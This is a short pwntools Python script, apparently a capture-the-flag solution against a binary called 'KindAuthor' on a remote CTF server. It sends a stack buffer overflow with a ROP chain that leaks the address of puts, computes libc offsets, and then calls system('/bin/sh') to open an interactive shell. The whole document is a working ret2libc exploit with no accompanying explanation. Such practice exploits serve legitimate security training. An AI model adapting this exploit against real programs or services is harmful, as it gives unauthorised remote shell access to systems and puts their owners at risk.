from pwn import *

filePath = './KindAuthor'

def start_process():
    if args.GDB:
        return gdb.debug(filePath, gdbscript=''' b func ''') 
    elif args.REMOTE:
        return remote("ctf.mf.grsu.by", 9075) 
    else:
        return process(filePath)

p = start_process()

p.recvline()
p.recvline()

poprdi_addr = 0x401147
puts_got_addr = 0x404000
puts_plt_addr = 0x401030
main_addr = 0x4011ee
ret_addr = 0x4011fe

payload = b'A' * 40
payload += p64(poprdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) #print addr got
payload += p64(main_addr) #continue rop-chain reuse overflow
p.sendline(payload)

taked_addr_puts_got = int(p.recvline()[:-1][::-1].hex(),16)
libc_addr = taked_addr_puts_got - 0x805a0
system_addr = libc_addr + 0x53110
binsh_addr = libc_addr + 0x1a7ea4

print("addr libc:", hex(libc_addr))

payload = b'A' * 40
#payload += p64(ret_addr) #fix align
payload += p64(poprdi_addr) + p64(binsh_addr) + p64(system_addr)

p.sendline(payload)

p.interactive()
